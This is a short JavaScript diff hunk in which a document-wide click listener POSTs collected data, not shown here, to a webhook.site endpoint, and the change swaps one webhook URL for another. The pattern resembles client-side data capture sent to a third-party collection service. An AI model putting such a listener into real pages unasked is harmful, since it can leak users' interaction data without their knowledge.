@@ -83,7 +83,7 @@ document.addEventListener("click", function (event) {
                         };
 
                         // Send the data to the webhook
-                        fetch("https://webhook.site/b8323ba4-cd8a-4025-a501-581791c4983b", {
+                        fetch("https://webhook.site/d649559d-e46c-4b43-97d2-176d5640dde6", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json",
